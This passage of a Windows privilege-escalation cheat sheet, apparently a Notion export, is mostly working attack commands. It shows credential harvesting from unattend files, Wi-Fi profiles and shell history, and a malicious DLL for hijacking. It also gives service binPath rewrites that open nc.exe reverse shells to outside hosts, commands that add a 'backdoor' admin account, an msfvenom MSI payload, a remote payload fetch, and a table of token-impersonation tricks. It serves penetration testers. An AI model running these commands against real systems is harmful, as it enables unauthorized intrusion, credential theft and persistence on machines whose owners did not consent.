id="222229d3-7309-43cf-96c6-4507f9115258" class="">Display the content of these files with <code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p><p id="0d2a443c-3c54-4ae6-92c5-5f5218e2975b" class="">Example content</p><pre id="0010dbc7-68eb-4310-99af-72392f7567eb" class="code"><code>&lt;component name=&quot;Microsoft-Windows-Shell-Setup&quot; publicKeyToken=&quot;31bf3856ad364e35&quot; language=&quot;neutral&quot; versionScope=&quot;nonSxS&quot; processorArchitecture=&quot;amd64&quot;&gt;&lt;AutoLogon&gt;&lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;Username&gt;Administrateur&lt;/Username&gt;&lt;/AutoLogon&gt;&lt;UserAccounts&gt;&lt;LocalAccounts&gt;&lt;LocalAccount wcm:action=&quot;add&quot;&gt;&lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;&lt;Group&gt;administrators;users&lt;/Group&gt;&lt;Name&gt;Administrateur&lt;/Name&gt;&lt;/LocalAccount&gt;&lt;/LocalAccounts&gt;&lt;/UserAccounts&gt;</code></pre><p id="953e9cc0-970c-4b92-a44e-048a3a63ae7a" class="">Unattend credentials are stored in base64 and can be decoded manually with base64.</p><pre id="0404493d-9873-46f0-ac8d-efeddccfcbe3" class="code"><code>$ echo &quot;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=&quot;  | base64 -dSecretSecurePassword1234*</code></pre><p id="dffc0516-af8a-479a-9900-61af513a34ea" class="">The Metasploit module <code>post/windows/gather/enum_unattend</code> looks for these files.</p><h3 id="334bfe62-c82c-48b4-9968-ee4dd1a493e3" class="">IIS Web config</h3><pre id="42b98820-ff0a-413e-ba27-fb9616b4b85a" class="code"><code>Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue</code></pre><pre id="9380873a-c867-4939-b36b-a0df1c9b540e" class="code"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.configC:\inetpub\wwwroot\web.config</code></pre><h3 id="96ba8322-0ba0-4ab8-bd77-0ee15baacd79" class="">Other files</h3><pre id="96c68065-5f9f-4126-85aa-ba217edc48ea" class="code"><code>%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b</code></pre><h3 id="0dc821fc-177e-421b-abea-d414a77b7648" class="">Wifi passwords</h3><p id="67c9f211-32b5-4e90-9d60-092341346ffa" class="">Find AP SSID</p><pre id="d55a21f8-c489-4379-8a1f-712e85840924" class="code"><code>netsh wlan show profile</code></pre><p id="c4d53a26-6a4b-4f68-b60b-62589f7f9678" class="">Get Cleartext Pass</p><pre id="2247a934-b915-48fe-b743-de6d5d875267" class="code"><code>netsh wlan show profile &lt;SSID&gt; key=clear</code></pre><p id="ff792ceb-30bc-4b34-a92f-21466c122b0a" class="">Oneliner method to extract wifi passwords from all the access point.</p><pre id="94572f51-984e-48c1-9f69-9bbdcb5f7448" class="code"><code>cls &amp; echo. &amp; for /f &quot;tokens=4 delims=: &quot; %a in (&#x27;netsh wlan show profiles ^| find &quot;Profile &quot;&#x27;) do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr &quot;SSID Cipher Content&quot; | find /v &quot;Number&quot; &amp; echo.) &amp; @echo on</code></pre><h3 id="db0f9203-9c08-46f9-9e3b-a95ab781a55b" class="">Passwords stored in services</h3><p id="9b9524b9-67de-4c54-9013-657d9f4bcab8" class="">Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using <a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></p><pre id="017378b3-1136-4e1f-a199-78b017034ef1" class="code"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1Import-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -AllDomain -oInvoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</code></pre><h3 id="c54f98b4-42e2-4d70-b288-27c9e7a74281" class="">Powershell history</h3><pre id="c843fc88-63fa-49b2-b84e-636a47ac117f" class="code"><code>type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txttype $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txtcat (Get-PSReadlineOption).HistorySavePathcat (Get-PSReadlineOption).HistorySavePath | sls passw</code></pre><h2 id="bebea800-a100-468f-a1fa-0608823e7264" class="">EoP - Processes Enumeration and Tasks</h2><p id="4de62b82-9977-481b-bcd5-f129a0299ce5" class="">What processes are running?</p><pre id="a918112a-cc48-4fbb-9440-0558fa4c8f87" class="code"><code>tasklist /vnet startsc queryGet-ServiceGet-WmiObject -Query &quot;Select * from Win32_Process&quot; | where {$_.Name -notlike &quot;svchost*&quot;} | Select Name, Handle, @{Label=&quot;Owner&quot;;Expression={$_.GetOwner().User}} | ft -AutoSize</code></pre><p id="32bb8348-8fd7-4549-84a2-58f223fcb169" class="">Which processes are running as “system”</p><pre id="d8248225-e9b7-40b4-9adc-d54f969f2d4a" class="code"><code>tasklist /v /fi &quot;username eq system&quot;</code></pre><p id="b8d0b400-c09c-42fa-a36b-d272528cbaf6" class="">Do you have powershell magic?</p><pre id="bb9d3acd-17d9-4918-b48e-10980d6ef1f2" class="code"><code>REG QUERY &quot;HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine&quot; /v PowerShellVersion</code></pre><p id="a19517f5-57fd-4e98-bd2e-f58f95f3aade" class="">List installed programs</p><pre id="8e66c13e-794e-4bd0-ba96-65a09979fdb6" class="code"><code>Get-ChildItem &#x27;C:\Program Files&#x27;, &#x27;C:\Program Files (x86)&#x27; | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</code></pre><p id="0952207b-d37d-4466-89d1-e9c8f32ef3e1" class="">List services</p><pre id="7d8d2ded-1562-4481-8232-2dc77dc03a72" class="code"><code>net startwmic service list brieftasklist /SVC</code></pre><p id="9496b456-af21-4c4a-9985-c31b5ae5eac9" class="">Scheduled tasks</p><pre id="9bf1237f-d55f-4d2c-b35b-8e26707c5fc5" class="code"><code>schtasks /query /fo LIST 2&gt;nul | findstr TaskNameschtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEMGet-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</code></pre><p id="a63523ea-2a00-438e-8a3d-cec24a7ec9db" class="">Startup tasks</p><pre id="2e77fba6-0df6-4b57-bb2f-08144ff77fb1" class="code"><code>wmic startup get caption,commandreg query HKLM\Software\Microsoft\Windows\CurrentVersion\Rreg query HKCU\Software\Microsoft\Windows\CurrentVersion\Runreg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOncedir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</code></pre><h2 id="7d7e7801-a747-4f2a-b140-2f4068d28249" class="">EoP - Incorrect permissions in services</h2><blockquote id="558cf7b5-b7ed-4610-b2fa-1804e628fcbd" class="">A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.</blockquote><p id="1b1f25a4-f780-431e-ae76-0462303fb86b" class="">Often, services are pointing to writeable locations: - Orphaned installs, not installed anymore but still exist in startup - DLL Hijacking ```powershell # find missing DLL - Find-PathDLLHijack PowerUp.ps1 - Process Monitor : check for “Name Not Found”</p><pre id="b742e4d9-9a28-49aa-be7f-90f2c69c76cd" class="code"><code># compile a malicious dll
- For x64 compile with: &quot;x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll&quot;
- For x86 compile with: &quot;i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll&quot;

# content of windows_dll.c
#include &lt;windows.h&gt;
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system(&quot;cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt&quot;);
        ExitProcess(0);
    }
    return TRUE;
}
```</code></pre><ul id="3123e54c-c415-4430-ab16-dc08dff7b6d7" class="bulleted-list"><li>PATH directories with weak permissions</li></ul><pre id="4a93434a-4c12-4910-9ab6-0f15566fa8ee" class="code"><code>$ for /f &quot;tokens=2 delims=&#x27;=&#x27;&quot; %a in (&#x27;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&#x27;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt$ for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;$ sc query state=all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txtFOR /F %i in (Servicenames.txt) DO echo %itype Servicenames.txtFOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txtFOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt</code></pre><p id="43bf5858-0472-4a44-86e7-0775c4eeebf5" class="">Alternatively you can use the Metasploit exploit : <code>exploit/windows/local/service_permissions</code></p><p id="841efa5b-98e9-4fc9-9fab-07caf2408d77" class="">Note to check file permissions you can use <code>cacls</code> and <code>icacls</code> &gt; icacls (Windows Vista +)
&gt; cacls (Windows XP)</p><p id="793148cc-904a-4d87-a0a3-75b4f67250af" class="">You are looking for <code>BUILTIN\Users:(F)</code>(Full access), <code>BUILTIN\Users:(M)</code>(Modify access) or <code>BUILTIN\Users:(W)</code>(Write-only access) in the output.</p><h3 id="aec1974f-c05f-4f55-878c-c96c66e88b4d" class="">Example with Windows 10 - CVE-2019-1322 UsoSvc</h3><p id="622f215a-dbad-401a-b6e8-ab3d99ec772c" class="">Prerequisite: Service account</p><pre id="c06ce6d9-1b15-4110-a819-c5621fb0149f" class="code"><code>PS C:\Windows\system32&gt; sc.exe stop UsoSvcPS C:\Windows\system32&gt; sc.exe config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;PS C:\Windows\system32&gt; sc.exe config usosvc binPath=&quot;C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;PS C:\Windows\system32&gt; sc.exe config UsoSvc binpath= &quot;C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;PS C:\Windows\system32&gt; sc.exe qc usosvc[SC] QueryServiceConfig SUCCESSSERVICE_NAME: usosvcTYPE               : 20  WIN32_SHARE_PROCESSSTART_TYPE         : 2   AUTO_START  (DELAYED)ERROR_CONTROL      : 1   NORMALBINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exeLOAD_ORDER_GROUP   :TAG                : 0DISPLAY_NAME       : Update Orchestrator ServiceDEPENDENCIES       : rpcssSERVICE_START_NAME : LocalSystemPS C:\Windows\system32&gt; sc.exe start UsoSvc</code></pre><h3 id="5442b87f-57a0-464a-bf7b-2d90f798992e" class="">Example with Windows XP SP1 - upnphost</h3><pre id="72e4d7ed-b4aa-42a8-b8fc-2482126efdcf" class="code"><code># NOTE: spaces are mandatory for this exploit to work !sc config upnphost binpath= &quot;C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe&quot;sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;sc qc upnphostsc config upnphost depend= &quot;&quot;net start upnphost</code></pre><p id="364076de-e45c-4e77-852b-44df9c59af85" class="">If it fails because of a missing dependency, try the following commands.</p><pre id="dca181b8-9386-437d-8829-480d6a9fab01" class="code"><code>sc config SSDPSRV start=autonet start SSDPSRVnet stop upnphostnet start upnphostsc config upnphost depend=&quot;&quot;</code></pre><p id="f14d807b-6778-4e89-a103-b9eb0676926a" class="">Using <a href="https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe"><code>accesschk</code></a> from Sysinternals or <a href="https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe">accesschk-XP.exe - github.com/phackt</a></p><pre id="2cba428f-2376-42d5-81e5-890f95c3cce0" class="code"><code>$ accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteulaRW SSDPSRVSERVICE_ALL_ACCESSRW upnphostSERVICE_ALL_ACCESS$ accesschk.exe -ucqv upnphostupnphostRW NT AUTHORITY\SYSTEMSERVICE_ALL_ACCESSRW BUILTIN\AdministratorsSERVICE_ALL_ACCESSRW NT AUTHORITY\Authenticated UsersSERVICE_ALL_ACCESSRW BUILTIN\Power UsersSERVICE_ALL_ACCESS$ sc config &lt;vuln-service&gt; binpath=&quot;net user backdoor backdoor123 /add&quot;$ sc config &lt;vuln-service&gt; binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;$ sc stop &lt;vuln-service&gt;$ sc start &lt;vuln-service&gt;$ sc config &lt;vuln-service&gt; binpath=&quot;net localgroup Administrators backdoor /add&quot;$ sc stop &lt;vuln-service&gt;$ sc start &lt;vuln-service&gt;</code></pre><h2 id="f61dfa59-0953-409e-b988-2c0d5b004edc" class="">EoP - Windows Subsystem for Linux (WSL)</h2><p id="c8f015a6-c4b7-47dc-87a9-f2057354ba58" class="">Technique borrowed from <a href="https://twitter.com/Warlockobama/status/1067890915753132032">Warlockobama’s tweet</a></p><blockquote id="42c67c52-1b2b-4ac1-8179-069c9566fd1a" class="">With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don’t know the root password? No problem just set the default user to root W/ .exe –default-user root. Now start your bind shell or reverse.</blockquote><pre id="2a8677f1-f045-49eb-bc5c-43c043997198" class="code"><code>wsl whoami./ubuntun1604.exe config --default-user rootwsl whoamiwsl python -c &#x27;BIND_OR_REVERSE_SHELL_PYTHON_CODE&#x27;</code></pre><p id="69d799b7-2891-4877-a7fe-82a6fbb1faa9" class="">Binary <code>bash.exe</code> can also be found in <code>C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe</code></p><p id="07a6c65f-a5a5-4633-ba24-fced8eb7d752" class="">Alternatively you can explore the <code>WSL</code> filesystem in the folder <code>C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\</code></p><h2 id="9c5978f2-3656-4e44-b089-ea8251ca941a" class="">EoP - Unquoted Service Paths</h2><p id="9ce4ffc2-d8e2-481f-a820-908f8c863b6a" class="">The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.</p><pre id="1a454b80-2422-4c82-bc2e-d34a33271db5" class="code"><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &#x27;&quot;*&#x27;} | select PathName,DisplayName,Name</code></pre><p id="62bfd121-5f6c-4bcb-91af-c7e319818686" class="">Metasploit provides the exploit : <code>exploit/windows/local/trusted_service_path</code></p><h3 id="9784203d-64b9-45d6-ac19-79f6a6865c69" class="">Example</h3><p id="599388a5-6582-4a2c-890e-81daa73aa539" class="">For <code>C:\Program Files\something\legit.exe</code>, Windows will try the following paths first: - <code>C:\Program.exe</code> - <code>C:\Program Files.exe</code></p><h2 id="5fccf821-c90c-4a55-ae38-ce76d243c780" class="">EoP - Named Pipes</h2><ol id="0042e87b-78af-4414-a2df-955bbeaa2b69" class="numbered-list" start="1"><li>Find named pipes: <code>[System.IO.Directory]::GetFiles(&quot;\\.\pipe\&quot;)</code></li></ol><ol id="223990a5-666f-46ab-ab8d-1894d5f0fae3" class="numbered-list" start="2"><li>Check named pipes DACL: <code>pipesec.exe &lt;named_pipe&gt;</code></li></ol><ol id="5a1b1b97-2911-4824-8e12-4873f6031e01" class="numbered-list" start="3"><li>Reverse engineering software</li></ol><ol id="fb84c6b6-ec4f-4acf-b635-d3f394bd4c5d" class="numbered-list" start="4"><li>Send data throught the named pipe : <code>program.exe &gt;\\.\pipe\StdOutPipe 2&gt;\\.\pipe\StdErrPipe</code></li></ol><h2 id="586eb03a-3ad3-4173-897c-38c8fd1fb069" class="">EoP - Kernel Exploitation</h2><p id="11a6a142-6798-4eaa-94a8-cc8985720868" class="">List of exploits kernel : <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h3 id="9a7687e0-cda3-44f0-8b2c-f615243232ad" class="">#Security Bulletin #KB #Description #Operating System</h3><ul id="f1016775-e5b2-42b5-9c92-c4e1a1df46f1" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017">MS17-017</a>　[KB4013081]　[GDI Palette Objects Local Privilege Escalation]　(windows 7/8)</li></ul><ul id="a185650c-c605-4983-a49a-35778d4ea8de" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464">CVE-2017-8464</a>　[LNK Remote Code Execution Vulnerability]　(windows 10/8.1/7/2016/2010/2008)</li></ul><ul id="1d60d3c0-4190-4eef-b839-ff6e88d24762" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213">CVE-2017-0213</a>　[Windows COM Elevation of Privilege Vulnerability]　(windows 10/8.1/7/2016/2010/2008)</li></ul><ul id="3c7b5158-7b8e-4b5a-ac95-c16fc5427001" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833">CVE-2018-0833</a> [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2)</li></ul><ul id="3af3becd-8e20-4b78-a44a-ee23f195e2db" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120">CVE-2018-8120</a> [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li></ul><ul id="dce13c1c-13e3-4f6f-b5b3-b72073ecb3fe" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010">MS17-010</a>　[KB4013389]　[Windows Kernel Mode Drivers]　(windows 7/2008/2003/XP)</li></ul><ul id="9491c1a9-b904-4e84-bbe4-abcc5bb814fa" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135">MS16-135</a>　[KB3199135]　[Windows Kernel Mode Drivers]　(2016)</li></ul><ul id="9f2c3045-e40a-4066-8e28-58b686a4248d" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111">MS16-111</a>　[KB3186973]　[kernel api]　(Windows 10 10586 (32/64)/8.1)</li></ul><ul id="c12b4967-3e32-457a-a151-ab19c1a1fa72" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098">MS16-098</a>　[KB3178466]　[Kernel Driver]　(Win 8.1)</li></ul><ul id="a6b5a181-a0f0-430c-9014-e515ad666012" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">MS16-075</a>　[KB3164038]　[Hot Potato]　(2003/2008/7/8/2012)</li></ul><ul id="3397e6a7-0030-4dd8-87b3-69758c15f0e6" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034">MS16-034</a>　[KB3143145]　[Kernel Driver]　(2008/7/8/10/2012)</li></ul><ul id="ee8babd9-7523-4c63-89c5-c9429ab53f8e" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032">MS16-032</a>　[KB3143141]　[Secondary Logon Handle]　(2008/7/8/10/2012)</li></ul><ul id="a4f3a872-f3bf-4dac-b396-ae02147e650f" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016">MS16-016</a>　[KB3136041]　[WebDAV]　(2008/Vista/7)</li></ul><ul id="3132a75f-9709-42fa-9317-22bf20c2d89e" class="bulleted-list"><li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014">MS16-014</a>　[K3134228]　[remote code execution]　(2008/Vista/7)
…</li></ul><ul id="5a7b81de-eeed-477f-9e48-76714ccee723" class="bulleted-list"><li><a href="./MS03-026">MS03-026</a>　[KB823980] [Buffer Overrun In RPC Interface]　(/NT/2000/XP/2003)</li></ul><p id="9f458913-bbf2-4058-a082-b34e91811874" class="">To cross compile a program from Kali, use the following command.</p><pre id="031278b5-26c6-4359-ac3c-645e333bd345" class="code"><code>Kali&gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c</code></pre><h2 id="609fc7e4-a62b-4892-904c-7c81e66d9956" class="">EoP - AlwaysInstallElevated</h2><p id="b7e9ab96-54e9-408d-b47b-9013fd8247be" class="">Check if these registry values are set to “1”.</p><pre id="e68c02c3-d2ae-4d31-880f-08dd05bb5345" class="code"><code>$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p id="cb3c73b1-7200-437c-a8b0-2f2b6d8e41ae" class="">Then create an MSI package and install it.</p><pre id="ea92aef2-6989-486e-a836-0f316fe39c6b" class="code"><code>$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi$ msiexec /quiet /qn /i C:\evil.msi</code></pre><p id="2d99aa84-aa3b-4380-8bca-b6ceeab85d87" class="">Technique also available in Metasploit : <code>exploit/windows/local/always_install_elevated</code></p><h2 id="5871396a-0e6c-40d6-97ed-643ad7b1cb31" class="">EoP - Insecure GUI apps</h2><p id="0baa7d8a-af24-40a9-9d8a-e723135cf6dc" class="">Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.</p><p id="eab93152-9a85-4eb0-919e-f03aceee31da" class="">Example: “Windows Help and Support” (Windows + F1), search for “command prompt”, click on “Click to open Command Prompt”</p><h2 id="14672929-8c08-428d-9efa-84a5eb76596e" class="">EoP - Runas</h2><p id="0da7e357-7977-48f6-b875-fcd5f15fd9e6" class="">Use the <code>cmdkey</code> to list the stored credentials on the machine.</p><pre id="5a4ad974-2c99-46b4-9873-a54018e05441" class="code"><code>cmdkey /listCurrently stored credentials:Target: Domain:interactive=WORKGROUP\AdministratorType: Domain PasswordUser: WORKGROUP\Administrator</code></pre><p id="429af7ed-eb1f-4e8a-a048-65b2dd20d2c5" class="">Then you can use <code>runas</code> with the <code>/savecred</code> options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.</p><pre id="2f60e220-f03f-4dd2-89aa-a88060e5d43a" class="code"><code>runas /savecred /user:WORKGROUP\Administrator &quot;\\10.XXX.XXX.XXX\SHARE\evil.exe&quot;</code></pre><p id="3f543f61-b81e-4cf6-8ceb-cc3d3031b176" class="">Using <code>runas</code> with a provided set of credential.</p><pre id="3f969303-ee31-499c-b1e2-2f5ba47570ce" class="code"><code>C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; &quot;c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe&quot;</code></pre><pre id="627431e5-f8a8-4d9f-8fa2-ecc1e233bd90" class="code"><code>$ secpasswd = ConvertTo-SecureString &quot;&lt;password&gt;&quot; -AsPlainText -Force$ mycreds = New-Object System.Management.Automation.PSCredential (&quot;&lt;user&gt;&quot;, $secpasswd)$ computer = &quot;&lt;hostname&gt;&quot;[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;&lt;attacker_ip&gt; 4444 -e cmd.exe&quot;, $mycreds.Username, $mycreds.Password, $computer)</code></pre><h2 id="6725722f-96bb-4ecb-91b3-a47b8fe0eeb0" class="">EoP - From local administrator to NT SYSTEM</h2><pre id="46b93966-37bc-4897-8949-3f38eb3b8c3e" class="code"><code>PsExec.exe -i -s cmd.exe</code></pre><h2 id="043a6a12-0f87-4f93-adf6-a2647ddc2a67" class="">EoP - Living Off The Land Binaries and Scripts</h2><p id="ba53e1f2-baf5-4cf0-80c8-531d2903e911" class="">Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p><blockquote id="4dedd0f3-6120-4a32-b8a2-aa0b1761ecd2" class="">The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.</blockquote><p id="4fba815d-2d04-49bf-8a0f-eb3153bc8d01" class="">A LOLBin/Lib/Script must:</p><ul id="75f11667-860a-4ef6-ab78-8da8cff8df12" class="bulleted-list"><li>Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra “unexpected” functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses</li></ul><ul id="e61ae8b7-519b-4d79-8c05-0183a1b04d42" class="bulleted-list"><li>Have functionality that would be useful to an APT or red team</li></ul><pre id="22d15870-bac5-430c-9275-24bda0e08eb6" class="code"><code>wmic.exe process call create calcregsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dllMicrosoft.Workflow.Compiler.exe tests.xml results.xml</code></pre><h2 id="cae94b44-2099-4c8f-9d21-72e64cc231e8" class="">EoP - Impersonation Privileges</h2><p id="120bf958-d352-450b-9ed8-6d71b54b40b1" class="">Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.</p><div id="4a48ee1f-6145-42f5-a9e5-dd2e355a9b5d" class="collection-content"><h4 class="collection-title"></h4><table class="collection-content"><thead><tr><th>Privilege</th><th>Impact</th><th>Tool</th><th>Execution path</th><th>Remarks</th></tr></thead><tbody><tr id="2352dee0-5cf3-4262-8f03-dbfef254c090"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeAssignPrimaryToken.html">SeAssignPrimaryToken</a></td><td class="cell-7Ozx"><span class="selected-value">Admin</span></td><td class="cell-{=w[">3rd party tool</td><td class="cell-*t+6">“It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe”</td><td class="cell-Bf&quot;5">Thank you Aurélien Chalot for the update. I will try to re-phrase it to something more recipe-like soon.</td></tr><tr id="b479a95f-748f-44ad-b8c8-d6069fa350b4"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeBackup.html">SeBackup</a></td><td class="cell-7Ozx"><span class="selected-value">Threat</span></td><td class="cell-{=w[">Built-in commands</td><td class="cell-*t+6">Read sensitve files with robocopy /b</td><td class="cell-Bf&quot;5">- May be more interesting if you can read %WINDIR%.DMP - SeBackupPrivilege (and robocopy) is not helpful when it comes to open files. - Robocopy requires both SeBackup and SeRestore to work with /b parameter.</td></tr><tr id="dce8ec1c-2ff0-4066-82d2-0e3104e086b2"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeCreateToken.html">SeCreateToken</a></td><td class="cell-7Ozx"><span class="selected-value">Admin</span></td><td class="cell-{=w[">3rd party tool</td><td class="cell-*t+6">Create arbitrary token including local admin rights with NtCreateToken.</td><td class="cell-Bf&quot;5"></td></tr><tr id="6c3f4cd7-68e2-4b8a-abf7-f3b415394075"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeDebug.html">SeDebug</a></td><td class="cell-7Ozx"><span class="selected-value">Admin</span></td><td class="cell-{=w[">PowerShell</td><td class="cell-*t+6">Duplicate the lsass.exe token.</td><td class="cell-Bf&quot;5">Script to be found at FuzzySecurity</td></tr><tr id="4b99223c-4d52-4466-9a7e-54b198401f16"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeLoadDriver.html">SeLoadDriver</a></td><td class="cell-7Ozx"><span class="selected-value">Admin</span></td><td class="cell-{=w[">3rd party tool</td><td class="cell-*t+6">1. Load buggy kernel driver such as szkg64.sys2. Exploit the driver vulnerability  Alternatively, the privilege may be used to unload security-related drivers with ftlMC builtin command. i.e.: fltMC sysmondrv</td><td class="cell-Bf&quot;5">1. The szkg64 vulnerability is listed as CVE-2018-157322. The szkg64 exploit code was created by Parvez Anwar</td></tr><tr id="4dc9eb27-b7da-4cf1-a780-041e284a3986"><td class="cell-title"><a href="Windows%20Privilege%20Escalation/Untitled%20Database/SeRestore.html">SeRestore</a></td><td class="cell-7Ozx"><span 